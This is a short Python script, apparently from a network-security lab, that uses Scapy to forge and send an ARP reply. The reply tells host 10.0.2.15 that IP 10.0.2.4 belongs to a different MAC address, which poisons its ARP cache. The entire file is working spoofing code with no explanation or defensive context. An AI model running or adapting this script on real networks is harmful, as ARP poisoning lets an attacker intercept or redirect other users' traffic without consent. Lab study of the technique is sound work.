#!/usr/bin/env python
from scapy.all import *

ether = Ether()
ether.dst = '08:00:27:84:c0:4e'
arp = ARP()
arp.op = 2
arp.psrc = '10.0.2.4'
arp.hwsrc = '08:00:27:2d:90:61'
arp.pdst = '10.0.2.15'
arp.hwdst = '08:00:27:84:c0:4e'

pkt = ether/arp
sendp(pkt)

pkt.show()
